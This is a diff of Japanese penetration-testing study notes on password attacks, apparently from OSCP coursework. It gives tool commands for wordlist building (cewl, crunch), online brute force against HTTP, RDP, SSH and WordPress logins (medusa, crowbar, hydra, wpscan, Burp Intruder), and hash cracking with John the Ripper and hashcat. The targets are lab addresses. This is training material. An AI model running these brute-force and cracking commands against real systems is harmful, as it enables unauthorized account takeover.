@@ -1,14 +1,16 @@
 # PasswordAttacks
 
-### wordlistの作成
+## wordlistの作成(cewl)
 
 ```
-cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
+cewl www.megacorpone.com -m 3 -w megacorp-cewl.txt
 wc -l megacorp-cewl.txt
 grep Nano megacorp-cewl.txt
 ```
 
-### wordlistの末尾に数字2桁を自動付与する方法
+
+
+## wordlistの末尾に数字2桁を自動付与する方法
 
 John the ripperの設定ファイルにルールを追加する
 
@@ -61,7 +63,9 @@ grep Nanobot mutated.txt
 
 --stdout：結果を標準出力に出力
 
-### crunchを用いたwordlist作成
+
+
+## crunchを用いたwordlist作成
 
 | PLACEHOLDER | CHARACTER TRANSLATION              |
 | ----------- | ---------------------------------- |
@@ -110,7 +114,7 @@ Crunch will now generate the following number of lines: 20158125312
 
 
 
-### medusaを用いたパスワードリスト攻撃
+## medusaを用いたパスワードリスト攻撃
 
 ```bash
 medusa -h 192.168.250.10 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
@@ -121,7 +125,7 @@ medusa -d
 
 
 
-### Crowbarを用いたパスワードリスト（RDP）
+## Crowbarを用いたパスワードリスト（RDP）
 
 ```
 sudo apt install crowbar
@@ -132,7 +136,7 @@ crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
 
 
 
-### ハッシュ種類の特定
+## ハッシュ種類の特定
 
 ```bash
 hashid c43ee559d69bc7f691fe2fbfe8a5ef0a
@@ -141,7 +145,104 @@ hashid '$6$l5bL6XIASslBwwUD$bCxeTlbhTH76wE.bI66aMYSeDXKQ8s7JNFwa1s1KkTand6ZsqQKA
 
 
 
-### Pass the Hash (pth-winexe)
+## John the ripper
+
+パスワードリストとハッシュファイルを用意すること
+
+.rarファイルの場合
+
+```
+rar2john flag.rar > /home/student/hash.txt
+zip2john flag.zip > hash.txt
+```
+
+```
+john --wordlist=/home/student/mutated.txt /home/student/hash.txt 
+```
+
+NTLM形式
+
+```
+alice:1004:aad3b435b51404eeaad3b435b51404ee:b74242f37e47371aff835a6ebcac4ffe:::
+```
+
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
+```
+
+ワードマングリング
+
+```
+john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
+```
+
+NT：NTLMハッシュ
+
+https://miloserdov.org/?p=5477
+
+https://www.openwall.com/john/doc/RULES.shtml
+
+* /etc/shadowのハッシュについて
+* http://hitsumabushi-pc.blogspot.com/2011/12/etcshadow.html
+* ![image-20230212095848774](img/PasswordAttacks/image-20230212095848774.png)
+
+
+
+### Hashcat
+
+```bash
+hashcat -m 1000 -a 0 077cccc23f8ab7031726a3b70c694a49 /usr/share/wordlists/rockyou.txt
+```
+
+-m：hash-type
+
+https://hashcat.net/wiki/doku.php?id=example_hashes
+
+ここでどのハッシュかを確認しながら設定するパラメータを決めるとよい
+
+もしくは`hashcat --help | less`でみる。こちらの方はカテゴリタイプがあっていい。
+
+<img src="img/PasswordAttacks/image-20230212101119357.png" alt="image-20230212101119357" style="zoom:50%;" />
+
+-a：attack-mode
+
+![image-20230212101224924](img/PasswordAttacks/image-20230212101224924.png)
+
+```bash
+hashcat --help
+```
+
+
+
+### hydra
+
+```
+hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
+```
+
+```bash
+hydra -l offsec -P /usr/share/wordlists/rockyou.txt 172.18.0.2 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F172.18.0.2%2Fwp-admin%2F&testcookie=1:F=incorrect.'
+```
+
+### WPscan
+
+```bash
+wpscan --url http://localhost:80/ -U offset -P /usr/share/wordlists/rockyou.txt
+```
+
+https://github.com/wpscanteam/wpscan/wiki/WPScan-User-Documentation
+
+### secList
+
+https://github.com/danielmiessler/SecLists/tree/master/Passwords
+
+### patator(mysql)
+
+https://www.kali.org/tools/patator/
+
+
+
+## Pass the Hash (pth-winexe)
 
 ```bash
 ┌──(kali㉿kali)-[~/Documents/OSCP/19.PasswordAttacks]
@@ -162,61 +263,17 @@ https://yougottahackthat.com/blog/339/what-is-aad3b435b51404eeaad3b435b51404ee
 
 
 
-### John the ripper
+### burp suite intruder(9章に詳細説明あり)
 
-パスワードリストとハッシュファイルを用意すること
+パスワードのみ変数設定する
 
-.rarファイルの場合
+![image-20230224220043434](img/PasswordAttacks/image-20230224220043434.png)
 
-```
-rar2john flag.rar > /home/student/hash.txt
-zip2john flag.zip > hash.txt
-```
+cewlで作成したパスワードリストを設定する
 
-```
-john --wordlist=/home/student/mutated.txt /home/student/hash.txt 
-```
+![image-20230224220116955](img/PasswordAttacks/image-20230224220116955.png)
 
-```
-john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
-```
+攻撃をスタートする。応答の長さで判断する
 
-ワードマングリング
+![image-20230224220226256](img/PasswordAttacks/image-20230224220226256.png)
 
-```
-john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
-```
-
-https://miloserdov.org/?p=5477
-
-https://www.openwall.com/john/doc/RULES.shtml
-
-
-
-### hydra
-
-```
-hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
-```
-
-```bash
-hydra -l offsec -P /usr/share/wordlists/rockyou.txt 172.18.0.2 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F172.18.0.2%2Fwp-admin%2F&testcookie=1:F=incorrect.'
-```
-
-
-
-### WPscan
-
-```bash
-wpscan --url http://localhost:80/ -U offset -P /usr/share/wordlists/rockyou.txt
-```
-
-https://github.com/wpscanteam/wpscan/wiki/WPScan-User-Documentation
-
-
-
-
-
-### secList
-
-https://github.com/danielmiessler/SecLists/tree/master/Passwords
